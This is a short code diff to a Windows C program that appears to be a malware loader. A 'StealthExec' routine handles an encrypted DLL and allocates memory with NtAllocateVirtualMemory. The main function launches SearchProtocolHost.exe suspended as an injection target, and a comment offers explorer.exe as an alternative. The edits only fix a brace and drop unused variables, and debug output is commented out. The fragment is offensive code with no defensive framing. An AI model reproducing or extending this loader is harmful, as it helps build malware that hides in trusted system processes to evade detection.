@@ -27,6 +27,7 @@ void StealthExec(HANDLE hProc, HANDLE hThread, const char* dllEnc) {
     if (status != 0) {
         // printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
         return;
+    }
     // } else {
     //     printf("[+] Memory allocated at: %p\n", memLoc);
     // }
@@ -75,10 +76,8 @@ int main(int argc, char* argv[]) {
     PROCESS_INFORMATION pInfo = { 0 };
 
     const char* procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
-    const char* procName = "SearchProtocolHost.exe";
     //Also work with explorer.exe
     //const char* targetProcess = "C:\\Windows\\explorer.exe";
-    //const char* targetProcessName = "explorer.exe";
 
     if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo)) {
         // printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
